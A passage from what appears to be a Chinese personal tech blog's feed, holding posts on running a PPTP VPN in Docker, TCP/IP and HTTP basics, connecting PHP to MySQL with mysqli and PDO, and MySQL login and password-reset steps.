&quot;https://registry.docker-cn.com&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意，一定要保证该文件符合 json 规范，否则 Docker 将不能启动</p></blockquote><p>重启docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure><h3 id="检查加速是否生效"><a href="#检查加速是否生效" class="headerlink" title="检查加速是否生效"></a>检查加速是否生效</h3><p>配置加速器之后，如果拉取镜像仍然十分缓慢，请手动检查加速器配置是否生效，在命令行执行 <code>docker info</code>，如果从结果中看到了如下内容，说明配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Registry Mirrors:</span><br><span class="line"> https://registry.docker-cn.com/</span><br></pre></td></tr></table></figure><h3 id="针对非ROOT用户"><a href="#针对非ROOT用户" class="headerlink" title="针对非ROOT用户"></a>针对非ROOT用户</h3><p>请执行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker</span><br><span class="line"></span><br><span class="line">sudo usermod -aG docker $&#123;USER&#125;</span><br></pre></td></tr></table></figure><p>重新登录</p><h2 id="docker使用说明"><a href="#docker使用说明" class="headerlink" title="docker使用说明"></a>docker使用说明</h2><p>网上有人总结的很好，如果有不懂可以随时翻阅</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://yeasy.gitbooks.io/docker_practice/content/image/pull.html</span><br></pre></td></tr></table></figure><h2 id="搭建VPN"><a href="#搭建VPN" class="headerlink" title="搭建VPN"></a>搭建VPN</h2><p>本次搭建的是PPTP模式的VPN，用到的镜像是<code>mobtitude/vpn-pptp</code></p><p>下载镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mobtitude/vpn-pptp</span><br></pre></td></tr></table></figure><p>在当前路径新建文件，文件名随意，我的命名为：<code>chap-secrets</code>，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name  *      pass  *</span><br></pre></td></tr></table></figure><p>执行如下命令，注意<code>-v</code>后<code>:</code>前你的路径和文件名是否和我的一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --privileged -p 1723:1723 -v /root/chap-secrets:/etc/ppp/chap-secrets mobtitude/vpn-pptp</span><br><span class="line"></span><br><span class="line">执行成功的结果是显示一长串字符</span><br></pre></td></tr></table></figure><p>之后就可以连接进行测试了，和上面Windows的一样</p><p>如果连接不成功，可以试试下面的命令，在此之前，需要删除正在运行的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">停止所有容器</span><br><span class="line">docker stop $(docker ps -qa)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除所有容器</span><br><span class="line">docker rm $(docker ps -qa)</span><br></pre></td></tr></table></figure><p>执行命令，注意<code>-v</code>后<code>:</code>前你的路径和文件名是否和我的一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --privileged --net host -v /root/chap-secrets:/etc/ppp/chap-secrets mobtitude/vpn-pptp</span><br></pre></td></tr></table></figure><p>完事儿~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Windows-Server-2008&quot;&gt;&lt;a href=&quot;#Windows-Server-2008&quot; class=&quot;headerlink&quot; title=&quot;Windows Server 2008&quot;&gt;&lt;/a&gt;Windows Server 2008&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="vpn,docker" scheme="https://clancyb00m.github.io/tags/vpn-docker/"/>
    
  </entry>
  
  <entry>
    <title>TCP/IP协议与HTTP协议</title>
    <link href="https://clancyb00m.github.io/2018/12/25/TCPIP%E5%8D%8F%E8%AE%AE%E4%B8%8EHTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>https://clancyb00m.github.io/2018/12/25/TCPIP协议与HTTP协议/</id>
    <published>2018-12-25T06:32:00.000Z</published>
    <updated>2018-12-30T10:47:49.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP协议与HTTP协议"><a href="#TCP-IP协议与HTTP协议" class="headerlink" title="TCP/IP协议与HTTP协议"></a>TCP/IP协议与HTTP协议</h1><h2 id="一、TCP-IP协议"><a href="#一、TCP-IP协议" class="headerlink" title="一、TCP/IP协议"></a>一、TCP/IP协议</h2><p>TCP/IP协议，也称TCP/IP协议族或TCP/IP协议栈，其中：</p><p>TCP：Transmission Control Protocol 传输控制协议<br>IP： Internet Protocol 互联网协议</p><p>该协议是目前世界上应用最为广泛的协议，是以TCP和IP为基础的不同层次上多个协议的集合，两台主机要实现通讯，都必须遵守TCP/IP协议。</p><p>以下是ISO/OSI七层模型与TCP/IP四层模型对比：</p><p><img src="/img/http/img01.png" alt=""></p><p>区别：</p><p>1、前者是七层模型结构，后者是四层模型结构；</p><p>2、实际市场应用不同， ISO/OSI参考模型只是理论上的模型，并没有成熟的产品支持；而TCP/IP参考模型已经成为“实际上的国际标准”。</p><p>五层协议与四层协议基本相同，只不过是将网络接口层分开为物理层和数据链路层。</p><h2 id="二、TCP三次握手和四次挥手"><a href="#二、TCP三次握手和四次挥手" class="headerlink" title="二、TCP三次握手和四次挥手"></a>二、TCP三次握手和四次挥手</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>首先看一张图片</p><p><img src="/img/http/img02.gif" alt=""></p><p>在学习TCP协议的“三次握手”之前，先来了解TCP报文及格式：当应用层向TCP层发送用于网间传输的、用8位字节表示的数据流时，TCP会把数据流分割成适当长度的报文段，之后TCP把数据包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。</p><h4 id="三次握手流程"><a href="#三次握手流程" class="headerlink" title="三次握手流程"></a>三次握手流程</h4><p>1.第一次握手：主机A将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给主机B，主机A进入SYN_SENT状态，等待主机B确认。</p><ol start="2"><li>第二次握手：主机B收到数据包后由标志位SYN=1得知主机A请求建立连接，主机B将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给主机A以确认连接请求，主机B进入SYN_RCVD状态。</li></ol><p>3.第三次握手：主机A收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给主机B，主机B检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，主机A和主机B进入ESTABLISHED状态，完成三次握手，随后就可以开始传输数据了</p><h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h3><p><img src="/img/http/img03.gif" alt=""></p><p>在了解4次挥手之前我们要知道为什么建立连接时是3次，而关闭时却是4次呢？</p><p>这是因为服务端的LISTEN状态下的SOCKET当收到SYN报文的连接请求后，它可以把ACK和SYN(ACK起应答作用，而SYN起同步作用)放在 一个报文里来发送。但关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部发送给对方了，所以你可能 未必会马上会关闭SOCKET,也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你同意现在可以关闭连接了，所以它这里的ACK报 文和FIN报文多数情况下都是分开发送的。 </p><p>（1）第一次挥手：客户端发送一个FIN，用来关闭客户端到服务器的数据传送，客户端进入FIN 1状态。         </p><p>（2）第二次挥手：服务器收到FIN后，发送一个ACK给客户端，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），客户端进入CLOSE_WAIT状态。         </p><p>（3）第三次挥手：服务器发送一个FIN，用来关闭服务器到客户端的数据传送，服务器进入LAST_ACK状态。         </p><p>（4）第四次挥手：客户端收到FIN后，进入TIME_WAIT状态，接着发送一个ACK给服务器，确认序号为收到序号+1，进入CLOSED状态，完成四次挥手。 </p><h3 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">21 FTP</span><br><span class="line"></span><br><span class="line">22 SSH</span><br><span class="line"></span><br><span class="line">23 Telnet</span><br><span class="line"></span><br><span class="line">25 SMTP</span><br><span class="line"></span><br><span class="line">80 http</span><br><span class="line"></span><br><span class="line">110 pop3</span><br><span class="line"></span><br><span class="line">135 smb</span><br><span class="line"></span><br><span class="line">443 https</span><br><span class="line"></span><br><span class="line">445 共享服务</span><br><span class="line"></span><br><span class="line">1433 sql server</span><br><span class="line"></span><br><span class="line">1531 oracle</span><br><span class="line"></span><br><span class="line">3306 mysql</span><br><span class="line"></span><br><span class="line">3389 rdp远程桌面</span><br><span class="line"></span><br><span class="line">5432 postgresql</span><br><span class="line"></span><br><span class="line">6379 redis</span><br><span class="line"></span><br><span class="line">7001weblogic</span><br><span class="line"></span><br><span class="line">8080 tomcat</span><br><span class="line"></span><br><span class="line">10051 zabbix</span><br><span class="line"></span><br><span class="line">27017 mongodb</span><br></pre></td></tr></table></figure><h2 id="二、HTTP协议"><a href="#二、HTTP协议" class="headerlink" title="二、HTTP协议"></a>二、HTTP协议</h2><p>HTTP协议作用在应用层，属于应用层协议。</p><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><ul><li><p>200 - 请求成功</p></li><li><p>301 - 资源（网页等）被永久转移到其它URL</p></li><li><p>404 - 请求的资源（网页等）不存在</p></li><li><p>500 - 内部服务器错误</p><p>| 200  | OK                    | 请求成功。一般用于GET与POST请求                              |<br>| —- | ——————— | ———————————————————— |<br>| 400  | Bad Request           | 客户端请求的语法错误，服务器无法理解                         |<br>| 403  | Forbidden             | 服务器理解请求客户端的请求，但是拒绝执行此请求               |<br>| 404  | Not Found             | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 |<br>| 405  | Method Not Allowed    | 客户端请求中的方法被禁止                                     |<br>| 500  | Internal Server Error | 服务器内部错误，无法完成请求                                 |<br>| 502  | Bad Gateway           | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 |</p></li></ul><h3 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h3><p><img src="/img/http/img04.png" alt=""></p><h3 id="常用URL编码"><a href="#常用URL编码" class="headerlink" title="常用URL编码"></a>常用URL编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;%27</span><br><span class="line">&quot;%22</span><br><span class="line">#%23</span><br><span class="line">空格        %20</span><br><span class="line">%%25</span><br><span class="line">+%2b</span><br></pre></td></tr></table></figure><h3 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h3><p><img src="/img/http/img05.png" alt=""></p><p>举例：</p><p>GET / HTTP/1.1</p><p>Host: 192.168.11.111:8000</p><p>Accept: <em>/</em></p><p>//换行</p><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><p>主要是GET和POST请求</p><h5 id="GET请求举例"><a href="#GET请求举例" class="headerlink" title="GET请求举例"></a>GET请求举例</h5><p><img src="/img/http/img06.png" alt=""></p><h5 id="POST请求举例"><a href="#POST请求举例" class="headerlink" title="POST请求举例"></a>POST请求举例</h5><p><img src="/img/http/img07.png" alt=""></p><h3 id="HTTP请求头和响应头"><a href="#HTTP请求头和响应头" class="headerlink" title="HTTP请求头和响应头"></a>HTTP请求头和响应头</h3><p>请求头：</p><p>User-Agent ；浏览器的标识信息</p><p>Accept 发送的数据类型（一般有text，json,xml）</p><p>Accept-Language  浏览器使用的语言</p><p>Accept-Encoding 指浏览器向中间件发送数据是使用的压缩方式</p><p>Host 访问的网站域名+端口</p><p>Cookie 网站认证信息</p><p>响应头：</p><p>Date 日期时间 这个时间为GTM时间，和我们的utc时间差8个小时</p><p>Set-Cookie cookie的来源（给网站设置Cookie）</p><p>Content-Type 告诉浏览器返回的内容格式</p><p>Serve 显示中间件的版本信息</p><p>X-Forwarded-By 使用的脚本语言</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TCP-IP协议与HTTP协议&quot;&gt;&lt;a href=&quot;#TCP-IP协议与HTTP协议&quot; class=&quot;headerlink&quot; title=&quot;TCP/IP协议与HTTP协议&quot;&gt;&lt;/a&gt;TCP/IP协议与HTTP协议&lt;/h1&gt;&lt;h2 id=&quot;一、TCP-IP协议&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="tcp,ip,http" scheme="https://clancyb00m.github.io/tags/tcp-ip-http/"/>
    
  </entry>
  
  <entry>
    <title>PHP连接MySQL</title>
    <link href="https://clancyb00m.github.io/2018/12/22/PHP%E8%BF%9E%E6%8E%A5MySQL/"/>
    <id>https://clancyb00m.github.io/2018/12/22/PHP连接MySQL/</id>
    <published>2018-12-22T06:32:00.000Z</published>
    <updated>2018-12-30T10:47:41.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP操作MySQL数据库"><a href="#PHP操作MySQL数据库" class="headerlink" title="PHP操作MySQL数据库"></a>PHP操作MySQL数据库</h1><p><strong>文中所讲不适用于实际场景，仅适用于本地练习，如有问题，后果自负</strong></p><p>我把这个过程分成了两大块：<strong>连接</strong>和<strong>操作</strong></p><ul><li>连接</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">写好配置信息，诸如：host、db_name、db_user、db_pwd等信息</span><br><span class="line"></span><br><span class="line">建立连接</span><br><span class="line"></span><br><span class="line">选择要操作的数据库</span><br><span class="line"></span><br><span class="line">设置请求和返回数据的字符集</span><br></pre></td></tr></table></figure><p>通常我喜欢把连接这部分写入单独的文件中，每次使用时，只需要在其他页面调用即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;conf.php&apos;;</span><br></pre></td></tr></table></figure><ul><li>操作</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造SQL语句</span><br><span class="line"></span><br><span class="line">执行SQL语句，如果有错，则报错</span><br><span class="line"></span><br><span class="line">从结果集中取出一行并返回</span><br><span class="line"></span><br><span class="line">关闭连接</span><br></pre></td></tr></table></figure><h2 id="使用mysqli扩展"><a href="#使用mysqli扩展" class="headerlink" title="使用mysqli扩展"></a>使用mysqli扩展</h2><p>使用mysqli扩展需要配置<code>php.ini</code>配置文件中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension_dir = &quot;你的php.exe的存放路径\ext&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除下面这句话前面的英文分号`;`</span><br><span class="line">;extension=php_mysqli.dll</span><br></pre></td></tr></table></figure><p>之后重启服务即可</p><p>注：下图中<code>$mysqli</code>为连接的<code>conf.php</code>中的第二步<code>建立连接</code>的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">include &apos;conf.php&apos;;</span><br><span class="line"></span><br><span class="line">#1.构造SQL语句，查找content表中id为1的记录</span><br><span class="line">$sql = &quot;SELECT * FROM content WHERE id = 1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#2.执行SQL语句</span><br><span class="line">$res = $mysqli-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">#如果语句本身有错，则报错</span><br><span class="line">    if (!$res)&#123; </span><br><span class="line">        die(&quot;SQL语句出错！&quot;.$mysqli-&gt;error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#3.fetch_assoc()从结果集中取出一行以关联数组形式返回并用foreach输出</span><br><span class="line">while($row = $res-&gt;fetch_assoc())&#123;</span><br><span class="line">    foreach ($row as $key=&gt;$value)&#123;</span><br><span class="line">    echo $key.&apos;=&apos;.$value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#4.关闭连接</span><br><span class="line">#mysqli-&gt;close();</span><br></pre></td></tr></table></figure><h2 id="使用mysql扩展"><a href="#使用mysql扩展" class="headerlink" title="使用mysql扩展"></a>使用mysql扩展</h2><p>此扩展只支持PHP版本5.5以下，所以就不赘述了</p><h2 id="使用PDO技术（防止SQL注入）"><a href="#使用PDO技术（防止SQL注入）" class="headerlink" title="使用PDO技术（防止SQL注入）"></a>使用PDO技术（防止SQL注入）</h2><p>操作步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.配置信息</span><br><span class="line"></span><br><span class="line">2.创建PDO对象</span><br><span class="line"></span><br><span class="line">3.执行SQL语句，编码</span><br><span class="line"></span><br><span class="line">4.构造SQL语句，在变化的地方使用`?`</span><br><span class="line"></span><br><span class="line">5.编译预处理</span><br><span class="line"></span><br><span class="line">6.传值，绑定</span><br><span class="line"></span><br><span class="line">7.执行SQL语句</span><br><span class="line"></span><br><span class="line">8.判断语句</span><br><span class="line"></span><br><span class="line">9.从结果集中取出一行并返回</span><br><span class="line"></span><br><span class="line">10.输出</span><br><span class="line"></span><br><span class="line">11.关闭连接</span><br></pre></td></tr></table></figure><p>代码实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$mysqli_conf = array(</span><br><span class="line">    &apos;host&apos;      =&gt;  &apos;127.0.0.1:3306&apos;,</span><br><span class="line">    &apos;db_user&apos;   =&gt;  &apos;root&apos;,</span><br><span class="line">    &apos;db_pwd&apos;    =&gt;  &apos;root&apos;,</span><br><span class="line">    &apos;db_name&apos;   =&gt;  &apos;test&apos;</span><br><span class="line">);</span><br><span class="line">//创建一个PDO对象</span><br><span class="line">$dsn = &quot;mysql:host=127.0.0.1&quot;;</span><br><span class="line">$dbuser = &apos;root&apos;;</span><br><span class="line">$dbpass = &apos;root&apos;;</span><br><span class="line">$pdo = new PDO($dsn,$dbuser,$dbpass);</span><br><span class="line">//执行SQL语句，编码</span><br><span class="line">$pdo-&gt;exec(&quot;set names &apos;utf8&apos;&quot;);</span><br><span class="line">//构造SQL语句，在变化的地方使用?</span><br><span class="line">$sql = &quot;select * from content where id = ?&quot;;</span><br><span class="line">#编译预处理</span><br><span class="line">$stmt = $pdo-&gt;prepare($sql);</span><br><span class="line">#传值，绑定</span><br><span class="line">$stmt-&gt;bindValue(1,&apos;1&apos;,PDO::PARAM_STR);第一个`1`指的是第一个`?`，第二个`1`是问号的内容</span><br><span class="line">#执行SQL语句</span><br><span class="line">$rs = $stmt-&gt;execute();</span><br><span class="line">#如果为真</span><br><span class="line">if ($rs)&#123;</span><br><span class="line">    #PDO::FETCH_ASSOC       关联数组形式</span><br><span class="line">    #PDO::FETCH_NUM         数字索引形式</span><br><span class="line">    #从结果集中取出一行并返回</span><br><span class="line">    while($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;</span><br><span class="line">    #输出</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        var_dump($row);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#关闭连接</span><br><span class="line">$pdo = null;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP操作MySQL数据库&quot;&gt;&lt;a href=&quot;#PHP操作MySQL数据库&quot; class=&quot;headerlink&quot; title=&quot;PHP操作MySQL数据库&quot;&gt;&lt;/a&gt;PHP操作MySQL数据库&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;文中所讲不适用于实际场景，仅适用于本
      
    
    </summary>
    
    
      <category term="php,mysql" scheme="https://clancyb00m.github.io/tags/php-mysql/"/>
    
  </entry>
  
  <entry>
    <title>MySQL数据库基础知识笔记</title>
    <link href="https://clancyb00m.github.io/2018/12/22/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/"/>
    <id>https://clancyb00m.github.io/2018/12/22/mysql数据库基础知识笔记/</id>
    <published>2018-12-22T04:23:00.000Z</published>
    <updated>2018-12-30T10:42:42.917Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>数据库即存储数据的仓库，是一个管理数据的软件</p><h2 id="数据库模型"><a href="#数据库模型" class="headerlink" title="数据库模型"></a>数据库模型</h2><ul><li>关系型数据库（也称结构化数据库）<ul><li>MySQL：轻量级开源数据库，适用于中小型企业，性能较好</li><li>MSSQL(SQL server)：微软开发的，适用于中大型企业，需要微软系统作为支撑，不支持跨平台</li><li>Oracle：收费，适用于大型企业的需求，支持跨平台，需要良好的硬件配置作为支撑</li><li>DB2</li><li>……</li></ul></li><li>非关系型数据库（也称非结构化数据库）<ul><li>redis、mongodb、Hbase、nosql等</li></ul></li></ul><h2 id="关系型数据库结构"><a href="#关系型数据库结构" class="headerlink" title="关系型数据库结构"></a>关系型数据库结构</h2><ol><li>数据库：可以看成是一个“文件柜”中的“小格子”</li><li>数据表：可以看成是一个具体的“文件”</li><li>记录、字段、数据<ul><li>一行，即一条记录</li><li>一列，即一个字段</li><li>行列交叉处，即数据</li></ul></li></ol><h1 id="MySQL登录和退出"><a href="#MySQL登录和退出" class="headerlink" title="MySQL登录和退出"></a>MySQL登录和退出</h1><p>登录MySQL有两种方式，一种是通过命令行登录进行操作，一种是通过工具登录进行操作，下面介绍通过DOS命令行进行登录</p><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>如果想在任意位置登录MySQL，则需要配置环境变量，如何判断是否配置好，可通过查看MySQL版本的命令进行判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -V#切记是大写的`V`</span><br></pre></td></tr></table></figure><p><img src="/img/mysql/mysql-V01.png" alt=""></p><p>如果出现如下情况即没有配置好：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘mysql -V 不是内部或外部命令，也不是可运行的程序或批处理文件。</span><br></pre></td></tr></table></figure><p>接下来进行配置，win7路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win7--&gt;计算机--&gt;属性--&gt;高级系统设置--&gt;高级--&gt;环境变量--&gt;系统变量--&gt;Path</span><br></pre></td></tr></table></figure><p>大差不差，网上教程很多，配一下就完事儿了，此处省略**字</p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>在DOS命令行中，执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 主机名 -u 用户名 -p 密码</span><br></pre></td></tr></table></figure><ul><li>-h：代表MySQL数据库主机名。本地主机名如：127.0.0.1。MySQL数据库默认端口号：3306</li><li>-u：代表MySQL用户名。如：root</li><li>-p：代表MySQL密码。如：root。在登录时，可以先不输入密码值</li></ul><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot -proot</span><br></pre></td></tr></table></figure><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h2><p>如果忘记密码，莫慌，老夫看你骨骼惊奇，这个重置密码的方法，就赐予你了：</p><h3 id="phpstudy重置数据库密码："><a href="#phpstudy重置数据库密码：" class="headerlink" title="phpstudy重置数据库密码："></a>phpstudy重置数据库密码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其他选项菜单--&gt;mysql工具--&gt;重置密码</span><br></pre></td></tr></table></figure><h3 id="Linux（centos7）修改root密码："><a href="#Linux（centos7）修改root密码：" class="headerlink" title="Linux（centos7）修改root密码："></a>Linux（centos7）修改root密码：</h3><ul><li>MySQL版本低于8：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.修改配置文件：vi /etc/my.cnf 添加：skip-grant-tables重启MySQL服务</span><br><span class="line"></span><br><span class="line">2.空密码登录： mysql -uroot</span><br><span class="line"></span><br><span class="line">3.改密码：</span><br><span class="line">update mysql.user set authentication_string=password(‘root&apos;),plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos; and host=&apos;localhost&apos;;</span><br><span class="line"></span><br><span class="line">4.更新数据库：flush privileges;</span><br><span class="line"></span><br><span class="line">5.退出</span><br><span class="line"></span><br><span class="line">6.再次修改配置文件，注释掉skip-grant-tables，重启MySQL服务，即可</span><br></pre></td></tr></table></figure><ul><li>MySQL版本为8及以上：</li></ul><p><strong>这里改的是初始密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 